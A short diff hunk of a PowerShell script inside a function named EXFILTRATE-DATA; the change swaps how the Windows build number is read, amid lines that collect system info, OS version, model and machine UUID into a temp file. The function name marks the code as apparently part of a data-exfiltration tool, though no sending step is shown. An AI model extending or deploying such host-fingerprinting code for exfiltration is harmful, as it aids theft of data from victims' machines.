@@ -11,7 +11,7 @@ function EXFILTRATE-DATA {
     $date = (get-date).toString("r")
     Get-ComputerInfo > $env:LOCALAPPDATA\Temp\system_info.txt
     $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
-    $osbuild = (Get-CimInstance Win32_OperatingSystem).Version 
+    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
     $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
     $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
     $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
